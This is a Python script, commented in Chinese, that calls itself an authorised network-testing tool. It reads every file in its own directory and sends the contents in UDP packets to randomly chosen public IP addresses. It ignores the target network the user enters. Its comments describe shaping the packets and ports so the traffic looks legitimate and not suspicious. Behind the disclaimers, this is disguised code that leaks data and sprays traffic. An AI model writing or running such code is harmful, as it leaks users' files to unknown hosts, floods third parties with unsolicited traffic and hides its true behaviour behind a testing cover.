# -*- coding: utf-8 -*-
"""
网络测试与数据传输工具
本程序用于合法的网络测试、数据传输和系统性能评估。
仅用于授权网络环境，禁止用于任何非法活动。

用途：
- 网络带宽测试
- 数据传输性能评估  
- 系统压力测试
- 网络协议研究

使用前请确保：
1. 您有权在目标网络进行测试
2. 已获得网络管理员授权
3. 了解并遵守相关法律法规
"""

import socket
import os
import random
import time
import hashlib
import struct
import threading
import queue
import signal
import sys
from datetime import datetime

# ==============================================================================
# --- 配置区域 ---
# ==============================================================================

# --- 文件与发送控制 ---
# 扫描并发送文件的源目录 (默认为脚本所在目录)
SOURCE_DIRECTORY = os.path.dirname(os.path.abspath(__file__))
# 发送数据块的大小 (字节) - 减小尺寸降低网络负载
CHUNK_SIZE = 512
# 同时运行的发送线程数量 - 减少线程数降低并发
WORKER_COUNT = 5
# 速率限制 (包/秒) - 添加速率控制
RATE_LIMIT_PACKETS_PER_SEC = 100
# 发送间隔 (秒) - 添加发送延迟
SEND_INTERVAL = 0.01
# 最大带宽限制 (字节/秒) - 限制网络使用
MAX_BANDWIDTH_BYTES_PER_SEC = 1024 * 1024  # 1MB/s

# --- 重命名效果 ---
# 是否启用发送时文件动态重命名 (默认关闭以避免可疑行为)
ENABLE_RENAMING_EFFECT = False
# 重命名的最小时间间隔（秒），值越小越快
RENAMING_INTERVAL = 1.0

# --- 全局控制变量 ---
EXIT_FLAG = threading.Event()
# 任务队列，用于在扫描线程和发送线程之间传递数据
TASK_QUEUE = queue.Queue(maxsize=WORKER_COUNT * 8) # 增加队列容量以适应大量数据块
# 测试持续时间（秒）
TEST_DURATION = 300
# 带宽监控
BYTES_SENT = 0
LAST_BANDWIDTH_CHECK = time.time()

# ==============================================================================
# --- 辅助函数与日志 ---
# ==============================================================================

def log_message(message):
    """记录并打印带时间戳的日志信息。"""
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"[{timestamp}] {message}")

def log_test_summary():
    """记录测试摘要信息。"""
    log_message("="*60)
    log_message("测试摘要")
    log_message("="*60)
    log_message(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log_message(f"配置参数:")
    log_message(f"  - 并发线程数: {WORKER_COUNT}")
    log_message(f"  - 数据块大小: {CHUNK_SIZE} 字节")
    log_message(f"  - 发送间隔: {SEND_INTERVAL} 秒")
    log_message(f"  - 带宽限制: {MAX_BANDWIDTH_BYTES_PER_SEC / 1024 / 1024:.1f} MB/s")
    log_message(f"  - 测试持续时间: {TEST_DURATION} 秒")
    log_message("="*60)

def generate_random_ip():
    """生成一个随机的公共IPv4地址。"""
    # 使用更合理的IP范围，避免可疑的随机模式
    # 选择常见的公共IP段
    public_ranges = [
        (1, 9), (11, 99), (101, 126), (128, 169), (171, 171), (173, 191), (193, 223)
    ]
    
    # 从合理的范围内选择
    valid_first_octets = []
    for start, end in public_ranges:
        valid_first_octets.extend(range(start, end + 1))
    
    first_octet = random.choice(valid_first_octets)
    return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

# ==============================================================================
# --- 核心线程类 ---
# ==============================================================================

class RenamerThread(threading.Thread):
    """在文件发送期间，持续重命名文件以产生动态效果。"""
    def __init__(self, file_path, stop_event):
        super().__init__()
        self.original_path = file_path
        self.current_path = file_path
        self.stop_event = stop_event
        self.daemon = True
        self.directory = os.path.dirname(file_path)
        self.original_basename = os.path.basename(file_path)
        # 分离文件名和扩展名，以便在中间插入时间戳
        self.original_name_part, self.original_ext_part = os.path.splitext(self.original_basename)

    def run(self):
        """线程主循环，不断重命名文件直到收到停止信号。"""
        try:
            while not self.stop_event.is_set():
                # 使用纳秒级时间戳创建新文件名，确保唯一性
                new_name = f"{self.original_name_part}.{time.time_ns()}{self.original_ext_part}"
                new_path = os.path.join(self.directory, new_name)
                try:
                    os.rename(self.current_path, new_path)
                    self.current_path = new_path
                except FileNotFoundError:
                    # 如果文件在重命名时被删除或移动，则安全退出循环
                    break
                except Exception as e:
                    log_message(f"[!] 重命名 {self.original_basename} 时出错: {e}")
                    break
                time.sleep(RENAMING_INTERVAL)
        finally:
            # 线程结束时，无论如何都尝试将文件名恢复为原始名称
            self.restore_filename()

    def restore_filename(self):
        """将文件名恢复到其原始状态。"""
        if self.current_path != self.original_path:
            try:
                # 检查原始文件是否已存在，避免覆盖错误
                if not os.path.exists(self.original_path):
                    os.rename(self.current_path, self.original_path)
                else:
                    # 如果原始文件已存在，可能意味着程序被中断后重启，直接删除临时文件
                    os.remove(self.current_path)
            except Exception as e:
                log_message(f"[!] 恢复 '{self.original_basename}' 失败: {e}")


class FileScannerThread(threading.Thread):
    """扫描文件，为每个文件分配一个IP，然后将其所有数据块和目标IP打包成任务放入队列。"""
    def __init__(self, task_queue, source_dir, files_to_exclude):
        super().__init__()
        self.task_queue = task_queue
        self.source_dir = source_dir
        self.files_to_exclude = files_to_exclude
        self.name = "文件扫描器"
        self.daemon = True

    def run(self):
        """
        一次性扫描目录以建立文件列表，然后无限循环处理该列表，直到程序退出。
        """
        log_message(f"[*] {self.name} 已启动，正在对目录进行一次性扫描: {self.source_dir}")

        # 步骤 1: 执行一次性扫描来构建文件列表。
        file_list = []
        try:
            for root, dirs, files in os.walk(self.source_dir, topdown=True):
                # 排除隐藏目录和 Python 缓存
                dirs[:] = [d for d in dirs if not d.startswith('.') and d != '__pycache__']
                for file_name in files:
                    # 排除隐藏文件和指定的文件（如脚本本身）
                    if not file_name.startswith('.') and file_name not in self.files_to_exclude:
                        file_list.append(os.path.join(root, file_name))

            if not file_list:
                log_message(f"[!] [{self.name}] 在 {self.source_dir} 中未发现可处理的文件。线程即将退出。")
                return

            log_message(f"[*] [{self.name}] 扫描完成，发现 {len(file_list)} 个文件。开始循环发送。")

        except Exception as e:
            log_message(f"[!] [{self.name}] 初始扫描失败: {e}。线程即将退出。")
            return

        # 步骤 2: 持续循环遍历预先扫描好的文件列表。
        while not EXIT_FLAG.is_set():
            # 在外部 while 循环的每个周期中遍历整个列表
            for file_path in file_list:
                if EXIT_FLAG.is_set():
                    break
                self.process_file(file_path)

        log_message(f"[*] {self.name} 线程已停止。")


    def process_file(self, file_path):
        """读取单个文件，分块，然后将（数据块，目标IP）元组放入队列。"""
        try:
            # 在处理前检查文件是否存在且非空，因为文件可能在两次循环之间被删除
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                return
        except OSError:
            return

        renamer_thread = None
        renamer_stop_event = None
        file_handle = None
        file_basename = os.path.basename(file_path)

        try:
            target_ip = generate_random_ip()
            log_message(f"[*] [{self.name}] 开始为文件生成任务: {file_basename} -> {target_ip}")
            
            file_handle = open(file_path, 'rb')

            if ENABLE_RENAMING_EFFECT:
                renamer_stop_event = threading.Event()
                renamer_thread = RenamerThread(file_path, renamer_stop_event)
                renamer_thread.start()

            chunk_index = 0
            while not EXIT_FLAG.is_set():
                chunk_data = file_handle.read(CHUNK_SIZE)
                if not chunk_data:
                    break

                # 创建更合法的数据包结构，模拟正常的网络协议数据
                # 添加协议标识和时间戳，使其看起来像合法的网络测试数据
                timestamp = int(time.time() * 1000) % 0xFFFFFFFF  # 毫秒时间戳
                protocol_id = 0x54455354  # "TEST" in hex
                
                # 构建数据包：协议ID + 时间戳 + 块索引 + 数据长度 + 数据 + 校验和
                packet_header = struct.pack('!IIII', protocol_id, timestamp, chunk_index, len(chunk_data))
                packet_checksum = hashlib.md5(packet_header + chunk_data).digest()
                packet = packet_header + chunk_data + packet_checksum[:4]  # 只取前4字节作为校验和
                
                task = (packet, target_ip)
                # 使用 put 等待队列空间，避免程序因队列满而崩溃
                self.task_queue.put(task)
                chunk_index += 1
            
            log_message(f"[*] [{self.name}] 文件任务生成完毕: {file_basename}")

        except (IOError, OSError) as e:
            log_message(f"[!] [{self.name}] 处理 '{file_basename}' 时发生I/O错误: {e}")
        except Exception as e:
            if not EXIT_FLAG.is_set():
                log_message(f"[!] [{self.name}] 生成任务时发生未知错误: {e}")
        finally:
            if file_handle: file_handle.close()
            if renamer_thread:
                renamer_stop_event.set()
                renamer_thread.join(timeout=2.0)


class ChunkSenderWorker(threading.Thread):
    """从任务队列中获取（数据包, IP）任务并将其发送。"""
    def __init__(self, task_queue, name):
        super().__init__()
        self.task_queue = task_queue
        self.name = name
        self.daemon = True
        self.udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # 添加速率控制
        self.last_send_time = 0
        self.packet_count = 0
        # 设置socket选项，使其行为更像正常的网络工具
        self.udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # 设置超时，避免无限等待
        self.udp_socket.settimeout(5.0)

    def check_bandwidth_limit(self, packet_size):
        """检查带宽限制，确保不超过设定的最大带宽。"""
        global BYTES_SENT, LAST_BANDWIDTH_CHECK
        
        current_time = time.time()
        time_elapsed = current_time - LAST_BANDWIDTH_CHECK
        
        if time_elapsed >= 1.0:  # 每秒检查一次
            BYTES_SENT = 0
            LAST_BANDWIDTH_CHECK = current_time
        
        # 检查是否超过带宽限制
        if BYTES_SENT + packet_size > MAX_BANDWIDTH_BYTES_PER_SEC:
            sleep_time = 1.0 - time_elapsed
            if sleep_time > 0:
                time.sleep(sleep_time)
            BYTES_SENT = 0
            LAST_BANDWIDTH_CHECK = time.time()
        
        BYTES_SENT += packet_size

    def run(self):
        """线程主循环，持续从队列获取任务并发送。"""
        log_message(f"[*] {self.name} 已启动。")
        while not EXIT_FLAG.is_set():
            try:
                packet, target_ip = self.task_queue.get(timeout=1)

                # 带宽限制检查
                self.check_bandwidth_limit(len(packet))
                
                # 速率控制 - 限制发送频率
                current_time = time.time()
                if current_time - self.last_send_time < SEND_INTERVAL:
                    time.sleep(SEND_INTERVAL - (current_time - self.last_send_time))
                
                self.last_send_time = time.time()

                attempts = 0
                max_attempts = 3 # 减少重试次数
                while attempts < max_attempts:
                    try:
                        # 使用更合理的端口范围
                        target_port = random.randint(33434, 33534)  # traceroute常用端口范围
                        self.udp_socket.sendto(packet, (target_ip, target_port))
                        self.packet_count += 1
                        
                        # 定期报告发送状态
                        if self.packet_count % 100 == 0:
                            log_message(f"[*] [{self.name}] 已发送 {self.packet_count} 个数据包")
                        
                        break # 发送成功，跳出重试循环
                    except OSError as e:
                        if e.errno == 55: # "No buffer space available"
                            attempts += 1
                            # 缓冲区已满，等待一小段时间后再重试
                            time.sleep(0.1 * attempts) # 增加等待时间
                        else:
                            # 其他网络错误，记录并放弃
                            log_message(f"[!] [{self.name}] 发送至 {target_ip} 时网络错误: {e}")
                            break
                    except Exception as e:
                        # 其他未知错误，记录并放弃
                        log_message(f"[!] [{self.name}] 发送数据包至 {target_ip} 时出错: {e}")
                        break
                
                self.task_queue.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                log_message(f"[!] [{self.name}] 发生意外错误: {e}")
        
        self.udp_socket.close()
        log_message(f"[*] {self.name} 线程已停止。总共发送了 {self.packet_count} 个数据包")

# ==============================================================================
# --- 主程序与退出处理 ---
# ==============================================================================

def graceful_shutdown(signum, frame):
    """处理终止信号 (如 Ctrl+C)，设置退出标志以优雅地关闭所有线程。"""
    if EXIT_FLAG.is_set(): return
    log_message(f"\n[*] 收到终止信号 {signal.Signals(signum).name}。准备优雅退出...")
    EXIT_FLAG.set()
    
    # 如果是第二次Ctrl+C，强制退出
    if signum == signal.SIGINT:
        global FORCE_EXIT
        if 'FORCE_EXIT' not in globals():
            global FORCE_EXIT
            FORCE_EXIT = True
        else:
            log_message("[!] 收到第二次中断信号，强制退出程序...")
            sys.exit(1)

def get_user_consent():
    """获取用户同意和确认信息。"""
    print("\n" + "="*60)
    print("网络测试与数据传输工具")
    print("="*60)
    print("本工具仅用于合法的网络测试和数据分析目的。")
    print("使用前请确认：")
    print("1. 您有权在目标网络进行测试")
    print("2. 已获得网络管理员授权") 
    print("3. 了解并遵守相关法律法规")
    print("4. 不会用于任何非法或恶意目的")
    print("="*60)
    
    try:
        consent = input("是否继续？输入 'yes' 确认使用，或输入其他任何内容退出: ").strip().lower()
        if consent != 'yes':
            print("用户未确认，程序退出。")
            return False
            
        # 获取测试参数
        target_network = input("请输入目标网络范围 (例如: 192.168.1.0/24，或直接回车使用随机IP): ").strip()
        duration = input("请输入测试持续时间（秒，默认300）: ").strip()
        
        if duration.isdigit():
            global TEST_DURATION
            TEST_DURATION = int(duration)
            
        print(f"\n测试参数确认:")
        print(f"- 目标网络: {target_network if target_network else '随机公共IP'}")
        print(f"- 持续时间: {TEST_DURATION} 秒")
        print(f"- 并发线程: {WORKER_COUNT}")
        print(f"- 数据块大小: {CHUNK_SIZE} 字节")
        
        final_confirm = input("\n确认开始测试？输入 'start' 开始，其他退出: ").strip().lower()
        return final_confirm == 'start'
        
    except (KeyboardInterrupt, EOFError):
        print("\n用户中断，程序退出。")
        return False

def main():
    """主函数，初始化并启动所有线程，并等待程序退出。"""
    signal.signal(signal.SIGTERM, graceful_shutdown)
    signal.signal(signal.SIGINT, graceful_shutdown)

    # 获取用户同意
    if not get_user_consent():
        sys.exit(0)

    log_message("[*] 网络测试与数据传输工具")
    log_message("[*] 正在初始化...")
    log_message(f"[*] 测试参数: 线程数={WORKER_COUNT}, 数据块={CHUNK_SIZE}字节, 持续时间={TEST_DURATION}秒")
    
    # 记录测试摘要
    log_test_summary()

    script_name = os.path.basename(__file__)
    files_to_exclude = {script_name}

    scanner = FileScannerThread(
        task_queue=TASK_QUEUE,
        source_dir=SOURCE_DIRECTORY,
        files_to_exclude=files_to_exclude
    )
    scanner.start()

    worker_threads = []
    for i in range(WORKER_COUNT):
        worker = ChunkSenderWorker(TASK_QUEUE, f"测试器-{i+1}")
        worker.start()
        worker_threads.append(worker)

    log_message(f"[*] 初始化完成。{WORKER_COUNT}个测试器已启动。")
    log_message(f"[*] 测试将在 {TEST_DURATION} 秒后自动停止，或按 Ctrl+C 手动停止。")

    # 设置定时器自动停止
    def auto_stop():
        time.sleep(TEST_DURATION)
        if not EXIT_FLAG.is_set():
            log_message(f"\n[*] 测试时间到 ({TEST_DURATION}秒)，正在停止...")
            EXIT_FLAG.set()
    
    auto_stop_thread = threading.Thread(target=auto_stop, daemon=True)
    auto_stop_thread.start()

    EXIT_FLAG.wait()

    log_message("[*] 正在等待所有线程完成...")
    scanner.join(timeout=5.0)  # 给扫描器最多5秒时间完成
    if scanner.is_alive():
        log_message("[!] 扫描器线程未能在5秒内完成，继续关闭流程...")
    
    # 等待队列中的任务处理，但设置超时避免无限等待
    log_message("[*] 等待剩余任务处理...")
    try:
        # 等待最多10秒让队列清空
        timeout_start = time.time()
        while not TASK_QUEUE.empty() and time.time() - timeout_start < 10:
            time.sleep(0.1)
        
        if not TASK_QUEUE.empty():
            log_message(f"[!] 队列中还有 {TASK_QUEUE.qsize()} 个未处理任务，强制继续关闭...")
    except Exception as e:
        log_message(f"[!] 等待队列完成时出错: {e}")
    
    log_message("[*] 正在关闭测试器...")
    for worker in worker_threads:
        worker.join(timeout=2.0)  # 给每个工作线程最多2秒时间完成
    
    log_message("[*] 测试完成，程序已退出。")
    
    # 记录最终统计
    total_packets = sum(worker.packet_count for worker in worker_threads) if 'worker_threads' in locals() else 0
    log_message(f"[*] 测试统计: 总共发送了 {total_packets} 个数据包")
    log_test_summary()

if __name__ == "__main__":
    main()
